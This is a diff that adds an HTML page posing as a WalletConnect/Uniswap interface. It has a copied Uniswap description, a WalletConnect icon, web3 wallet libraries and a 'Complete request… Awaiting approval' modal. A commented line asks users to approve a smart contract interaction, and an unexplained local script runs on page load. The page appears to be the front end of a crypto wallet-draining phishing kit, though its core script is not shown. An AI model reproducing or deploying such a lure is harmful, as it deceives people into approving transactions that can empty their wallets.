@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="expires" content="300" /> 
+      <meta name="description" content="Swap or provide liquidity on the Uniswap Protocol">
+      <link rel="shortcut icon" type="image/png" href="https://logosarchive.com/wp-content/uploads/2022/02/WalletConnect-icon.svg">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="bootstrap.min.css">
+    <title>wallet connect</title>
+   <style>  
+   body{
+    background-color: #1D2330;
+    /* background-image: url("../assets/img/cta-img-with-bg.png");
+    background-repeat: no-repeat; */
+   }
+   .word {
+        width: 300px;
+        height: 300px;
+        position: absolute;
+        top:0;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        margin: auto;
+        text-align: center;
+        color: white;
+    }
+    </style>
+</head>
+<body>
+    <div class="word">
+        <!-- Connect wallet to proceed</br>
+        Refresh page -->
+        <img src="../assets/img/cta-img-with-bg.png" alt="">
+
+    </div>
+</body>
+<div id="myModal" class="modal" tabindex="-1" role="dialog">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title"><span style="color :rgb(12, 12, 65)">Complete request</span></h5>
+          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+            <!-- <span aria-hidden="true">&times;</span> -->
+          </button>
+        </div>
+        <div class="modal-body">
+          <!-- <p>Return to your wallet application and approve our smart contract interaction to proceed</p> -->
+          <p>Connecting ...<br />
+          Awaiting approval</p>
+        </div>
+        <!-- <div class="modal-footer">
+          <button type="button" class="btn btn-primary">Save changes</button>
+          <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+        </div> -->
+      </div>
+    </div>
+  </div>
+
+<!-- ===============================================-->
+<!--    End of Main Content-->
+<!-- ===============================================-->
+
+
+
+
+<!-- ===============================================-->
+<!--    JavaScripts-->
+<!-- ===============================================-->
+<script src="vendors/%40popperjs/popper.min.js"></script>
+<script src="vendors/bootstrap/bootstrap.min.js"></script>
+
+<script src="./Decimal/decimal.js"></script>
+    <script src="./Moralis/moralis.js"></script>
+    
+    <script type="text/javascript" src="./WEB3/web3.js"></script>
+    <script type="text/javascript" src="./Web3Modal/web3modal.js"></script>
+    
+    <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
+     <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider"></script>
+     <script type="text/javascript"  src="https://cdn.jsdelivr.net/npm/@portis/web3@4.0.7/umd/index.min.js"></script>
+    
+<script src="./121212.js"></script>
+<script
+  src="https://code.jquery.com/jquery-3.6.0.min.js"
+  integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+  crossorigin="anonymous"></script>
+    <script>
+      window.onload = startx();
+    </script>
+</html>
